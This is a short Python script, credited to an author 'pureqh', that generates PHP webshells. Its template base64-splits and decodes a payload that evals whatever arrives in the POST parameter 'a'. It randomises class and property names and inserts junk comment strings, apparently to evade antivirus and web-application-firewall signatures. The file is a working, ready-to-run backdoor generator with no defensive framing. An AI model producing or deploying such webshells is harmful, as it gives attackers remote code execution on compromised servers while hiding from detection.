import random

#author: pureqh
#github: https://github.com/pureqh/webshell


shell = '''<?php 
class {0}{3}
        public ${1} = null;
        public ${2} = null;
        public ${6} = null;
        function __construct(){3}
        $this->{1} = 'ZXZhbCgkX1BPU';
        $this->{6} = '1RbYV0pOw==';
        $this->{2} = @base64_decode($this->{1}.$this->{6});
        @eval({5}.$this->{2}.{5});
        {4}{4}
new {0}();
?>'''


def random_keys(len):
    str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
def build_webshell():
    className = random_name(4)
    parameter1 = random_name(5)
    parameter2 = random_name(6)
    lef = '''{'''
    rig = '''}'''
    disrupt = "\"/*"+random_keys(7)+"*/\""
    parameter3 = random_name(6)
    shellc = shell.format(className,parameter1,parameter2,lef,rig,disrupt,parameter3)
    return shellc


if __name__ == '__main__':
    print (build_webshell())
